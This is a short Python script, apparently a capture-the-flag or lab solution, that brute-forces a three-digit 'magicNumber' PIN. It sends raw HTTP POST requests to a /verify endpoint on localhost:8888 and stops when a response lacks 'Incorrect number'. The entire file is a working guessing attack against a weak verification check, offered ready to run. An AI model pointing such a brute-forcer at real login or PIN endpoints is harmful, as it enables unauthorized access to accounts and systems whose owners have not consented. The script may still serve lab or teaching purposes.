import socket

# Define the server address and port
HOST = '127.0.0.1'
PORT = 8888

# Function to send the POST request using a raw socket connection
def send_request(pin):
    request = f"POST /verify HTTP/1.1\r\n"
    request += f"Host: {HOST}:{PORT}\r\n"
    request += f"Connection: close\r\n"
    request += f"Content-Length: {len('magicNumber=' + pin)}\r\n"
    request += f"Content-Type: application/x-www-form-urlencoded\r\n"
    request += f"\r\n"
    request += f"magicNumber={pin}\r\n"

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(request.encode())
        response = s.recv(4096).decode()
        return response

# Try all possible combinations from 000 to 999
def brute_force():
    for i in range(1000):
        pin = f"{i:03}"
        print(f"Trying {pin}...", end=' ')
        response = send_request(pin)

        if "Incorrect number" not in response:
            print(f"✅ Success! Magic number found: {pin}")
            break
        else:
            print("❌ Incorrect.")

# Start brute-forcing
brute_force()
